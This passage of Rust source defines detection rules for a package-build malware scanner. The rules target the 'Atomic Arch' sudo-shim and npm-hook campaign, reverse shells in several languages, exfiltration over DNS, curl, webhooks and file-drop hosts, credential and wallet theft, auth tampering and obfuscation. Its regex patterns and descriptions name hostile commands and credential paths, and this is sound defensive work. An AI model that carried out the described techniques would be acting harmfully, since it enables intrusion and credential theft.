            description: "Writes a `sudo` binary (or symlink) into `~/.local/bin` or another user PATH prefix. The Atomic Arch campaign dropped a credential-stealing sudo shim this way so a later `sudo` invocation harvested the password.".to_string(),
            severity: Severity::Critical,
            category: Category::MaliciousCode,
            patterns: vec![
                // A user PATH prefix ending in `/sudo`, however it is spelled.
                //
                // The old pattern required a literal `~` or `/home/<user>`
                // prefix, so `$HOME/.local/bin/sudo` and
                // `${XDG_BIN_HOME}/sudo` walked straight past a Critical rule.
                // Anchor on the PATH DIRECTORY instead of on how the home
                // directory was written: what matters is a `sudo` landing in a
                // directory that precedes /usr/bin on a user's PATH.
                Pattern::Regex {
                    pattern: r"(?:\.local/bin|\.bin|/usr/local/bin|/usr/local/sbin)/sudo\b"
                        .to_string(),
                },
                // Install verb whose DESTINATION is a user PATH prefix, with
                // `sudo` as the file name.
                //
                // The old form demanded the token `sudo` appear BEFORE the
                // destination directory, which is backwards from every real
                // command: `cp payload /usr/local/bin/sudo` and
                // `install -Dm755 stealer "$HOME/.local/bin/sudo"` both put the
                // name last, and neither matched. Covered by pattern 1 now, but
                // keep the verb form for a destination written as a variable
                // (`install -Dm755 shim "$bindir/sudo"`).
                Pattern::Regex {
                    pattern: r#"\b(?:cp|install|mv|ln)\b[^\n;&|]*\bsudo\b[^\n;&|]*(?:\.local/bin|/usr/local/bin)"#
                        .to_string(),
                },
                // `$XDG_BIN_HOME/sudo`. The XDG spec fixes that variable at
                // `~/.local/bin`, so a `sudo` written there is a shim by
                // definition -- matching it by NAME costs nothing.
                //
                // Deliberately NOT generalised to a bare `$var/sudo`:
                // `cp "$srcdir/sudo.conf" ...` is what the real `sudo` package
                // does, and a Critical false positive on the genuine article is
                // worse than the residual gap. A destination variable whose
                // VALUE is a user bin dir is resolved by the parser's variable
                // expansion and lands on pattern 1 anyway.
                Pattern::Regex {
                    pattern: r"\$\{?XDG_BIN_HOME\}?/sudo\b".to_string(),
                },
            ],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Do NOT build. A package must never install a sudo impostor. Inspect ~/.local/bin/sudo and rotate credentials if present.".to_string(),
            cwe_id: Some("CWE-506".to_string()),
            enabled: true,
            case_sensitive: false,
        },
        Rule {
            id: "ATOMIC-002".to_string(),
            name: "Node/Bun package manager in install hook".to_string(),
            description: "Invokes npm/pnpm/yarn/bun (or the npx/bunx runners) to install or run packages from an install hook. The June 2026 'Atomic Arch' campaign added post-install hooks running `npm install atomic-lockfile` / `bun install js-digest`. Legitimate packages never fetch or execute npm/bun packages during the install phase. `npm ci`, `npm rebuild`, `npm exec`, `pnpm dlx`, `yarn dlx`, and the bare `npx <pkg>` / `bunx <pkg>` runners all fetch-and-run lifecycle/remote code just like `install`.".to_string(),
            severity: Severity::Critical,
            category: Category::MaliciousCode,
            patterns: vec![
                // `ci` installs the full lockfile (lifecycle scripts run);
                // `exec`/`dlx`/`rebuild` fetch-and-run or re-run lifecycle code.
                // The cross terms that don't exist as real subcommands (e.g.
                // `npm dlx`, `yarn ci`) never appear in real PKGBUILDs, so
                // folding them into one alternation is simpler without adding FPs.
                // `explore <pkg> -- cmd` runs an arbitrary command in a package
                // dir (RCE); `exec`/`dlx`/`rebuild`/`ci` as before.
                Pattern::Regex {
                    pattern: r"\b(npm|pnpm|yarn)\s+(install|add|i|ci|dlx|exec|rebuild|explore)\b"
                        .to_string(),
                },
                // `bun` subcommands (NOT `bunx`, which is the runner below — the
                // `\s+` after `bun` excludes `bunx`).
                Pattern::Regex {
                    pattern: r"\bbun\s+(install|add|i|x)\b".to_string(),
                },
                // The npx-style RUNNERS: `npx <pkg>` / `bunx <pkg>` / `pnpx <pkg>`
                // fetch and run a package directly (no subcommand) — the most
                // common fetch-and-run RCE, and the exact form the old
                // `bunx?\s+(install|add|i|x)` and the npm-only alternation BOTH
                // missed. A bare runner followed by any argument is the attack.
                Pattern::Regex {
                    pattern: r"\b(npx|bunx|pnpx)\s+\S".to_string(),
                },
            ],
            file_types: vec![FileType::InstallScript],
            recommendation: "Install scripts must never fetch or install npm/bun packages. Inspect the PKGBUILD diff and report the package to the AUR maintainers.".to_string(),
            cwe_id: Some("CWE-494".to_string()),
            enabled: true,
            case_sensitive: false,
        },
        Rule {
            id: "ATOMIC-003".to_string(),
            name: "eBPF rootkit / payload artifact".to_string(),
            description: "References the eBPF rootkit object (scales.bpf.c) or the 'deps' hook path used by the June 2026 'Atomic Arch' payload to gain rootkit-like capabilities and hide itself.".to_string(),
            severity: Severity::Critical,
            category: Category::Persistence,
            patterns: vec![
                Pattern::Regex {
                    pattern: r"scales\.bpf\.c".to_string(),
                },
                Pattern::Regex {
                    pattern: r"src/hooks/deps\b".to_string(),
                },
            ],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "This is a rootkit dropper artifact. Do not build; treat the host as compromised and reinstall rather than clean.".to_string(),
            cwe_id: Some("CWE-506".to_string()),
            enabled: true,
            case_sensitive: false,
        },

        // ============================================================
        // PROACTIVE COVERAGE — additional reverse shells, exfil channels,
        // trust/auth tampering, and obfuscation, beyond the originally
        // reported samples. Each pattern is essentially never present in a
        // legitimate PKGBUILD; all inherit de-obfuscation + heredoc scoping.
        // ============================================================

        // --- reverse / bind shells (interpreters + fifo) ---
        Rule {
            id: "SHELL-005".to_string(),
            name: "Perl reverse shell".to_string(),
            description: "A Perl socket reverse shell (Socket + connect/exec).".to_string(),
            severity: Severity::Critical,
            category: Category::MaliciousCode,
            patterns: vec![Pattern::Regex { pattern: r"perl\s+.*(socket|IO::Socket).*(connect|exec|/bin/sh)".to_string() }],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Do not build. This is a remote shell.".to_string(),
            cwe_id: Some("CWE-94".to_string()),
            enabled: true,
            case_sensitive: false,
        },
        Rule {
            id: "SHELL-006".to_string(),
            name: "PHP reverse shell".to_string(),
            description: "A PHP reverse shell using fsockopen.".to_string(),
            severity: Severity::Critical,
            category: Category::MaliciousCode,
            patterns: vec![Pattern::Regex { pattern: r"php\s+-r\s+.*fsockopen".to_string() }],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Do not build. This is a remote shell.".to_string(),
            cwe_id: Some("CWE-94".to_string()),
            enabled: true,
            case_sensitive: false,
        },
        Rule {
            id: "SHELL-007".to_string(),
            name: "Ruby/Lua/AWK reverse shell".to_string(),
            description: "A reverse shell via Ruby TCPSocket, Lua socket, or AWK /inet/.".to_string(),
            severity: Severity::Critical,
            category: Category::MaliciousCode,
            patterns: vec![
                Pattern::Regex { pattern: r"ruby\s+.*(-rsocket|TCPSocket)".to_string() },
                Pattern::Regex { pattern: r"lua.*socket\.tcp\(".to_string() },
                Pattern::Regex { pattern: r"awk.*/inet/(tcp|udp)/".to_string() },
            ],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Do not build. This is a remote shell.".to_string(),
            cwe_id: Some("CWE-94".to_string()),
            enabled: true,
            case_sensitive: false,
        },
        Rule {
            id: "SHELL-008".to_string(),
            name: "Node.js reverse shell".to_string(),
            description: "A Node.js reverse shell using the net module.".to_string(),
            severity: Severity::Critical,
            category: Category::MaliciousCode,
            patterns: vec![Pattern::Regex { pattern: r#"node\s+-e\s+.*require\(['"]net['"]\).*(connect|createConnection)"#.to_string() }],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Do not build. This is a remote shell.".to_string(),
            cwe_id: Some("CWE-94".to_string()),
            enabled: true,
            case_sensitive: false,
        },
        Rule {
            id: "SHELL-009".to_string(),
            name: "OpenSSL-encrypted reverse shell".to_string(),
            description: "openssl s_client used as an encrypted C2 channel.".to_string(),
            severity: Severity::Critical,
            category: Category::MaliciousCode,
            patterns: vec![Pattern::Regex { pattern: r"openssl\s+s_client\s+.*-connect".to_string() }],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Do not build. This is an encrypted remote shell.".to_string(),
            cwe_id: Some("CWE-94".to_string()),
            enabled: true,
            case_sensitive: false,
        },
        Rule {
            id: "SHELL-010".to_string(),
            name: "Named-pipe (mkfifo) reverse shell".to_string(),
            description: "mkfifo paired with nc/openssl/ /dev/tcp — the classic backpipe reverse shell that evades `nc -e` detection.".to_string(),
            severity: Severity::Critical,
            category: Category::MaliciousCode,
            patterns: vec![Pattern::Regex { pattern: r"mkfifo\s+\S+.*(nc\s|ncat\s|openssl\s|/dev/(tcp|udp)/)".to_string() }],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Do not build. This is a remote shell.".to_string(),
            cwe_id: Some("CWE-94".to_string()),
            enabled: true,
            case_sensitive: false,
        },
        Rule {
            id: "SHELL-011".to_string(),
            name: "Busybox/telnet/ncat-ssl shell".to_string(),
            description: "A reverse shell via busybox nc -e, telnet piped to a shell, or ncat --ssl -e.".to_string(),
            severity: Severity::Critical,
            category: Category::MaliciousCode,
            patterns: vec![
                Pattern::Regex { pattern: r"busybox\s+nc\b.*-e".to_string() },
                Pattern::Regex { pattern: r"telnet\s+\S+\s+\d{2,5}\s*\|".to_string() },
                Pattern::Regex { pattern: r"ncat\b.*--ssl.*-e".to_string() },
            ],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Do not build. This is a remote shell.".to_string(),
            cwe_id: Some("CWE-94".to_string()),
            enabled: true,
            case_sensitive: false,
        },

        // --- exfiltration channels ---
        Rule {
            id: "EXFIL-004".to_string(),
            name: "DNS exfiltration".to_string(),
            description: "Data smuggled out via DNS lookups (dig/nslookup/host of a command-substituted subdomain, or a TXT query to an attacker domain).".to_string(),
            severity: Severity::Critical,
            category: Category::DataExfiltration,
            patterns: vec![
                Pattern::Regex { pattern: r"\b(dig|nslookup|host)\b\s+.*\$\(".to_string() },
                Pattern::Regex { pattern: r"\b(dig|nslookup)\b.*\b(TXT|@)\b".to_string() },
            ],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Review the destination domain; this pattern smuggles data over DNS.".to_string(),
            cwe_id: Some("CWE-200".to_string()),
            enabled: true,
            case_sensitive: false,
        },
        Rule {
            id: "EXFIL-006".to_string(),
            name: "HTTP upload exfiltration".to_string(),
            description: "curl uploading a local file (-T/--upload-file/-F/--data-urlencode) — used to send harvested data to an attacker endpoint.".to_string(),
            severity: Severity::High,
            category: Category::DataExfiltration,
            patterns: vec![Pattern::Regex { pattern: r"curl\s+.*(--upload-file|\s-T\s|--data-urlencode|\s-F\s)".to_string() }],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Verify what is being uploaded and to where.".to_string(),
            cwe_id: Some("CWE-200".to_string()),
            enabled: true,
            case_sensitive: false,
        },
        Rule {
            id: "EXFIL-007".to_string(),
            name: "wget POST exfiltration".to_string(),
            description: "wget --post-data/--post-file sending local data to a remote endpoint.".to_string(),
            severity: Severity::High,
            category: Category::DataExfiltration,
            patterns: vec![Pattern::Regex { pattern: r"wget\s+.*--post-(data|file)".to_string() }],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Verify what is being posted and to where.".to_string(),
            cwe_id: Some("CWE-200".to_string()),
            enabled: true,
            case_sensitive: false,
        },
        Rule {
            id: "EXFIL-008".to_string(),
            name: "Slack/Teams webhook exfiltration".to_string(),
            description: "Posting to a Slack or Microsoft Teams incoming webhook — a common low-friction exfil/C2 channel.".to_string(),
            severity: Severity::Critical,
            category: Category::DataExfiltration,
            patterns: vec![
                Pattern::Regex { pattern: r"hooks\.slack\.com/services/".to_string() },
                Pattern::Regex { pattern: r"webhook\.office\.com/webhookb2/".to_string() },
            ],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Remove. Packages do not post to chat webhooks during build/install.".to_string(),
            cwe_id: Some("CWE-200".to_string()),
            enabled: true,
            case_sensitive: false,
        },
        Rule {
            id: "EXFIL-009".to_string(),
            name: "Anonymous file-drop / tunnel host".to_string(),
            description: "Uploads to a throwaway file-drop or tunnels through ngrok/webhook.site/requestbin/IPFS — exfil and ad-hoc C2 endpoints.".to_string(),
            severity: Severity::High,
            category: Category::DataExfiltration,
            patterns: vec![Pattern::Regex { pattern: r"\b(file\.io|0x0\.st|transfer\.sh|oshi\.at|bashupload\.com|temp\.sh|ngrok\.(io|app|dev)|webhook\.site|requestbin\.(com|net)|pipedream\.net|ipfs\.io/api)\b".to_string() }],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Review the destination; these are common exfil/C2 hosts.".to_string(),
            cwe_id: Some("CWE-200".to_string()),
            enabled: true,
            case_sensitive: false,
        },
        Rule {
            id: "CRED-008".to_string(),
            name: "Environment/secret dump".to_string(),
            description: "Dumping the environment (env/printenv) to a file or pipe to curl/nc/base64 — harvests tokens and secrets exposed as env vars.".to_string(),
            severity: Severity::High,
            category: Category::CredentialTheft,
            patterns: vec![Pattern::Regex { pattern: r"\b(env|printenv)\b\s*(\|\s*(curl|wget|nc|base64|gzip)|>\s*\S)".to_string() }],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Remove. Packages have no reason to dump the environment.".to_string(),
            cwe_id: Some("CWE-522".to_string()),
            enabled: true,
            case_sensitive: false,
        },

        // --- broadened credential-store targets ---
        Rule {
            id: "CRED-004".to_string(),
            name: "Cloud / CI credential file access".to_string(),
            description: "Reads cloud or CI credential files (gcloud, docker config, npmrc, pypirc, cargo/terraform credentials, git-credentials).".to_string(),
            severity: Severity::High,
            category: Category::CredentialTheft,
            patterns: vec![Pattern::Regex { pattern: r"(\.git-credentials|\.config/gcloud|\.docker/config\.json|\.npmrc|\.pypirc|\.cargo/credentials|\.terraformrc|\.config/gh/hosts)".to_string() }],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Verify why a build/install touches credential files.".to_string(),
            cwe_id: Some("CWE-522".to_string()),
            enabled: true,
            case_sensitive: false,
        },
        Rule {
            id: "CRED-005".to_string(),
            name: "Keyring / wallet access".to_string(),
            description: "Reads OS keyrings (gnome-keyring/kwallet/secret-tool) or crypto wallet files (electrum/bitcoin/metamask/keystore).".to_string(),
            severity: Severity::Critical,
            category: Category::CredentialTheft,
            patterns: vec![Pattern::Regex { pattern: r"(\.local/share/keyrings|\.local/share/kwalletd|secret-tool\s+search|kwallet-query|\.electrum|\.bitcoin/wallet|wallet\.dat|nkbihfbeogaeaoehlefnkodbefgpgknn)".to_string() }],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Do not build. This harvests secrets/wallets.".to_string(),
            cwe_id: Some("CWE-522".to_string()),
            enabled: true,
            case_sensitive: false,
        },

        // --- account / auth / system tampering ---
        Rule {
            id: "PRIV-007".to_string(),
            name: "Privileged account manipulation".to_string(),
            description: "Creates or elevates an account to uid 0 / the wheel or sudo group — a backdoor-admin pattern.".to_string(),
            severity: Severity::Critical,
            category: Category::PrivilegeEscalation,
            patterns: vec![
                // uid/gid 0, or the -o/--non-unique flag (incl. combined like -ou).
                Pattern::Regex { pattern: r"\b(useradd|usermod)\b.*((-u|--uid)[= ]*0\b|-g[= ]*0\b|\s-\w*o\w*\b|--non-unique)".to_string() },
                // adding/creating an account in the wheel or sudo group.
                Pattern::Regex { pattern: r"\b(useradd|usermod|adduser)\b.*\b(wheel|sudo)\b".to_string() },
                Pattern::Regex { pattern: r"\bgpasswd\s+-a\s+\S+\s+(wheel|sudo)".to_string() },
            ],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Do not build. This grants an account administrative access.".to_string(),
            cwe_id: Some("CWE-269".to_string()),
            enabled: true,
            case_sensitive: false,
        },
        Rule {
            id: "PRIV-008".to_string(),
            name: "Password manipulation".to_string(),
            description: "Sets, resets, or clears an account password (chpasswd / passwd -d / piped passwd).".to_string(),
            severity: Severity::Critical,
            category: Category::PrivilegeEscalation,
            patterns: vec![
                Pattern::Regex { pattern: r"\bchpasswd\b".to_string() },
                Pattern::Regex { pattern: r"\bpasswd\s+-d\b".to_string() },
                Pattern::Regex { pattern: r"\|\s*passwd\s".to_string() },
            ],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Do not build. This changes account credentials.".to_string(),
            cwe_id: Some("CWE-269".to_string()),
            enabled: true,
            case_sensitive: false,
        },
        // ============================================================
        // CRITICAL: escaping the build root
        // ============================================================
        Rule {
            id: "ESCAPE-001".to_string(),
            name: "Extraction or copy outside the build root".to_string(),
            description: "An archive is extracted, or files are copied, to an absolute system path instead of $srcdir/$pkgdir. A build runs as your user and must only ever write inside its own directories; writing to / or /usr or /etc during build() installs files that no package owns and that pacman will never remove.".to_string(),
            severity: Severity::Critical,
            category: Category::PrivilegeEscalation,
            patterns: vec![
                // tar/unzip/cpio extracting to an absolute system root. `-C /`
                // and `-C /usr` are the shapes that matter; `-C "$srcdir"` and
                // `-C "$pkgdir/..."` are the normal forms and are excluded by
                // requiring a literal leading slash NOT followed by a variable.
                Pattern::Regex {
                    pattern: format!(
                        r"{CMD_START}(?:tar|bsdtar)\b[^\n;&|]*\s-C\s+/(?:usr|etc|opt|var|bin|sbin|lib|boot|root|srv)?(?:/|\s|$)"
                    ),
                },
                Pattern::Regex {
                    pattern: format!(
                        r"{CMD_START}unzip\b[^\n;&|]*\s-d\s+/(?:usr|etc|opt|var|bin|sbin|lib|boot|root|srv)?(?:/|\s|$)"
                    ),
                },
                // install/cp/mv writing to an absolute system path. The
                // destination must start with a literal `/` and a known system
                // directory -- `"$pkgdir/usr/bin"` starts with `$`, so it does
                // not match.
                Pattern::Regex {
                    pattern: format!(
                        r"{CMD_START}(?:install|cp|mv)\b[^\n;&|]*\s/(?:usr|etc|opt|boot|srv)/[^\s]*\s*$"
                    ),
                },
            ],
            file_types: vec![FileType::Pkgbuild],
            recommendation: "Extract and install into $srcdir and $pkgdir only. makepkg copies $pkgdir into the package; anything written elsewhere during a build is invisible to pacman.".to_string(),
            cwe_id: Some("CWE-22".to_string()),
            enabled: true,
            case_sensitive: false,
        },

        Rule {
            id: "TAMPER-001".to_string(),
            name: "Auth database write".to_string(),
            description: "Writes directly to /etc/passwd, /etc/shadow, /etc/group or /etc/gshadow — a direct backdoor-account injection.".to_string(),
            severity: Severity::Critical,
            category: Category::PrivilegeEscalation,
            patterns: vec![Pattern::Regex { pattern: r"(>>?|tee\s+-?a?)\s*\S*/etc/(passwd|shadow|group|gshadow)\b".to_string() }],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Do not build. This edits the live auth database.".to_string(),
            cwe_id: Some("CWE-269".to_string()),
            enabled: true,
            case_sensitive: false,
        },
        Rule {
            id: "TAMPER-002".to_string(),
            name: "doas/sudoers nopasswd grant".to_string(),
            description: "Grants passwordless privilege via /etc/doas.conf or a NOPASSWD sudoers rule.".to_string(),
            severity: Severity::Critical,
            category: Category::PrivilegeEscalation,
            patterns: vec![
                Pattern::Regex { pattern: r"/etc/doas\.conf".to_string() },
                Pattern::Regex { pattern: r"permit\s+(nopass|persist)".to_string() },
                Pattern::Regex { pattern: r"NOPASSWD".to_string() },
            ],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Do not build. This grants passwordless root.".to_string(),
            cwe_id: Some("CWE-269".to_string()),
            enabled: true,
            case_sensitive: false,
        },
        Rule {
            id: "TAMPER-005".to_string(),
            name: "PAM tampering".to_string(),
            description: "Inserts a permissive PAM module (pam_permit.so) or writes into /etc/pam.d — an authentication bypass.".to_string(),
            severity: Severity::Critical,
            category: Category::PrivilegeEscalation,
            patterns: vec![
                Pattern::Regex { pattern: r"pam_permit\.so".to_string() },
                Pattern::Regex { pattern: r"(>>?|tee).*?/etc/pam\.d/".to_string() },
            ],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Do not build. This tampers with authentication.".to_string(),
            cwe_id: Some("CWE-287".to_string()),
            enabled: true,
            case_sensitive: false,
        },
        Rule {
            id: "TAMPER-011".to_string(),
            name: "pacman signature downgrade".to_string(),
            description: "Sets SigLevel = Never in /etc/pacman.conf, disabling package signature verification so future malicious updates are accepted silently.".to_string(),
            severity: Severity::Critical,
            category: Category::MaliciousCode,
            patterns: vec![Pattern::Regex { pattern: r"SigLevel\s*=\s*Never".to_string() }],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Do not build. This disables pacman signature checking.".to_string(),
            cwe_id: Some("CWE-347".to_string()),
            enabled: true,
            case_sensitive: false,
        },
        Rule {
            id: "TAMPER-013".to_string(),
            name: "Security control disabled".to_string(),
            description: "Disables a firewall, SELinux/AppArmor, or stops a security/audit service.".to_string(),
            severity: Severity::High,
            category: Category::MaliciousCode,
            patterns: vec![
                Pattern::Regex { pattern: r"\b(setenforce\s+0|ufw\s+disable|aa-disable)\b".to_string() },
                Pattern::Regex { pattern: r"systemctl\s+(stop|disable|mask)\s+(auditd|apparmor|firewalld|nftables|ufw)".to_string() },
                Pattern::Regex { pattern: r"\b(iptables|ip6tables|nft)\b.*(\s-F\b|flush\s+ruleset)".to_string() },
            ],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Do not build. This weakens host security controls.".to_string(),
            cwe_id: Some("CWE-693".to_string()),
            enabled: true,
            case_sensitive: false,
        },
        Rule {
            id: "TAMPER-017".to_string(),
            name: "CA trust anchor injection".to_string(),
            description: "Installs a CA certificate into the system trust store — enables MITM of TLS for the whole system.".to_string(),
            severity: Severity::High,
            category: Category::MaliciousCode,
            patterns: vec![
                Pattern::Regex { pattern: r"trust\s+anchor\b".to_string() },
                Pattern::Regex { pattern: r"/etc/ca-certificates/trust-source/anchors".to_string() },
            ],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Verify the certificate; a rogue trust anchor enables TLS MITM.".to_string(),
            cwe_id: Some("CWE-295".to_string()),
            enabled: true,
            case_sensitive: false,
        },

        // --- supply-chain trust manipulation ---
        Rule {
            id: "TRUST-001".to_string(),
            name: "pacman keyring poisoning".to_string(),
            description: "Imports and locally-signs an arbitrary key into pacman's trust store (pacman-key --recv-keys/--lsign) so attacker-signed packages are accepted.".to_string(),
            severity: Severity::High,
            category: Category::MaliciousCode,
            patterns: vec![Pattern::Regex { pattern: r"pacman-key\s+.*(--recv-keys|--lsign|--lsign-key|\s-r\b)".to_string() }],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Do not build. Packages ship keys via keyring packages, not by importing at build time.".to_string(),
            cwe_id: Some("CWE-494".to_string()),
            enabled: true,
            case_sensitive: false,
        },
        Rule {
            id: "TRUST-002".to_string(),
            name: "GPG key import at build time".to_string(),
            description: "Imports or fetches a GPG key during build/install (gpg --import/--recv-keys/--keyserver).".to_string(),
            severity: Severity::Medium,
            category: Category::MaliciousCode,
            patterns: vec![Pattern::Regex { pattern: r"gpg\s+.*(--import|--recv-keys|--keyserver)".to_string() }],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Verify the key; importing a key to satisfy validpgpkeys from an untrusted source defeats the check.".to_string(),
            cwe_id: Some("CWE-494".to_string()),
            enabled: true,
            case_sensitive: false,
        },
        Rule {
            id: "DEP-003".to_string(),
            name: "Package index/registry override".to_string(),
            description: "Redirects a language package manager to a non-default index/registry (pip --index-url, npm registry, GOPROXY, etc.) — a dependency-confusion vector.".to_string(),
            severity: Severity::High,
            category: Category::Dependencies,
            // The rule stays case-insensitive overall (flags like `--index-url`
            // and npm's `npm_config_registry`, which npm honours in BOTH cases,
            // should match any spelling). But `PIP_INDEX_URL` and `GOPROXY` are
            // pinned case-exact with `(?-i:…)`: pip/go read only the upper-case
            // env var, so a lower-case `pip_index_url=`/`goproxy=` is an inert
            // local variable and matching it would be a false positive
            // (audit HI-6 env-NAME caveat; the rest of the env-NAME family is
            // handled rule-level via `case_sensitive`).
            patterns: vec![Pattern::Regex { pattern: r"(--index-url|--extra-index-url|(?-i:PIP_INDEX_URL)=|npm_config_registry=|--registry\s+https?|(?-i:GOPROXY)=|--default-registry)".to_string() }],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Verify the index host; overriding the registry redirects dependencies to an attacker source.".to_string(),
            cwe_id: Some("CWE-494".to_string()),
            enabled: true,
            case_sensitive: false,
        },
        Rule {
            id: "SRC-009".to_string(),
            name: "Obfuscated IP in URL".to_string(),
            description: "A source/download URL using an IPv6, hex, octal, or decimal IP literal to evade plain-IPv4 detection.".to_string(),
            severity: Severity::High,
            category: Category::NetworkSecurity,
            patterns: vec![
                Pattern::Regex { pattern: r"://\[[0-9a-fA-F:]+\]".to_string() },
                // hex / decimal IP literal as the WHOLE host (terminated by :, /, or
                // end) — not a dotted hostname like 0x0.st.
                Pattern::Regex { pattern: r"://0x[0-9a-fA-F]+(?:[:/]|$)".to_string() },
                Pattern::Regex { pattern: r"://\d{8,10}(?:[:/]|$)".to_string() },
            ],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Resolve and review the host; obfuscated IPs hide the real destination.".to_string(),
            cwe_id: Some("CWE-94".to_string()),
            enabled: true,
            case_sensitive: false,
        },

        // --- additional obfuscation / encoding ---
        Rule {
            id: "OBF-007".to_string(),
            name: "printf character assembly".to_string(),
            description: "A command assembled from printf hex/octal escapes (printf '\\x63\\x64' = 'cd') to hide it from literal matching.".to_string(),
            severity: Severity::High,
            category: Category::Obfuscation,
            patterns: vec![Pattern::Regex { pattern: r#"printf\s+["']?(\\x[0-9a-fA-F]{2}|\\0?[0-7]{2,3}){2,}"#.to_string() }],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Decode the printf escapes and review the assembled command.".to_string(),
            cwe_id: Some("CWE-506".to_string()),
            enabled: true,
            case_sensitive: false,
        },
        Rule {
            id: "OBF-008".to_string(),
            name: "Alternate-encoding decode".to_string(),
            description: "Decoding base32/base16 (an alternative to base64) to reconstruct a hidden payload.".to_string(),
            severity: Severity::High,
            category: Category::Obfuscation,
            patterns: vec![Pattern::Regex { pattern: r"\b(base32|base16)\s+(-d|--decode|-[a-zA-Z]*d)\b".to_string() }],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Decode and review the content.".to_string(),
            cwe_id: Some("CWE-506".to_string()),
            enabled: true,
            case_sensitive: false,
        },
        Rule {
            id: "OBF-011".to_string(),
            name: "Interpreter here-string execution".to_string(),
            description: "Feeding an assembled string to a shell via a here-string (sh <<< ...) — a common way to run a string that was built to dodge matching.".to_string(),
            severity: Severity::High,
            category: Category::Obfuscation,
            patterns: vec![Pattern::Regex { pattern: format!(r"{SHELL_LAUNCHER}{SHELL_PATH}\b{SHELLS}\b\s*<<<") }],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Review the here-string; this executes an assembled command.".to_string(),
            cwe_id: Some("CWE-94".to_string()),
            enabled: true,
            case_sensitive: false,
        },

        // --- additional remote-exec forms ---
        Rule {
            id: "EXEC-002".to_string(),
            name: "Shell -c command substitution fetch".to_string(),
            description: "sh -c \"$(curl ...)\" — fetches and runs remote code without an explicit pipe, evading the curl|sh rules.".to_string(),
            severity: Severity::Critical,
            category: Category::MaliciousCode,
            patterns: vec![Pattern::Regex { pattern: format!(r#"{SHELL_LAUNCHER}{SHELL_PATH}\b{SHELLS}\b\s+-c\s+["']?\$\(\s*(curl|wget|aria2c|fetch|http)\b"#) }],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Do not build. This runs code fetched from a URL.".to_string(),
            cwe_id: Some("CWE-494".to_string()),
            enabled: true,
            case_sensitive: false,
        },
        Rule {
            id: "EXEC-005".to_string(),
            name: "Detached background execution".to_string(),
            description: "Launches a fetched/dropped payload detached from the build (setsid/nohup), so it keeps running after install.".to_string(),
            severity: Severity::Medium,
            category: Category::MaliciousCode,
            patterns: vec![Pattern::Regex { pattern: r"\b(setsid|nohup)\b.*(curl|wget|/tmp/|\bbash\b|\bsh\b|\s\./)".to_string() }],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Review the detached process; this outlives the install.".to_string(),
            cwe_id: Some("CWE-506".to_string()),
            enabled: true,
            case_sensitive: false,
        },
        Rule {
            id: "EXEC-006".to_string(),
            name: "sqlite3 shell-command execution".to_string(),
            description: "sqlite3's `.shell`/`.system` dot-commands run an arbitrary shell command, and `.import` can read an attacker-controlled file — an exec/RCE vector hidden inside what looks like a database call. Legitimate packages do not drive sqlite3 through these meta-commands.".to_string(),
            severity: Severity::High,
            category: Category::MaliciousCode,
            // Require the dot-command form: a `.` preceded by whitespace or a
            // quote (the start of a sqlite3 meta-command), so a filename like
            // `data.import` or a column named `system` is not matched.
            patterns: vec![Pattern::Regex {
                pattern: r#"\bsqlite3\b[^\n]*[\s"']\.(?:shell|system|import)\b"#.to_string(),
            }],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Do not build. sqlite3 .shell/.system run arbitrary commands; report the package.".to_string(),
            cwe_id: Some("CWE-94".to_string()),
            enabled: true,
            case_sensitive: false,
        },
        Rule {
            id: "EXEC-007".to_string(),
            name: "make reads a Makefile from stdin".to_string(),
            description: "`make -f -` / `make -f /dev/stdin` executes a Makefile fed on standard input (commonly the tail of a `curl ... | make -f -` fetch-and-run). A Makefile is arbitrary shell recipes, so this is RCE from an unverified source. Normal `make` / `make -f Makefile` builds are unaffected.".to_string(),
            severity: Severity::High,
            category: Category::CommandInjection,
            // The `-`/`/dev/stdin` operand must stand alone (followed by space or
            // EOL) so `make -j4`, `make -C dir`, `make --version` do NOT match.
            patterns: vec![Pattern::Regex {
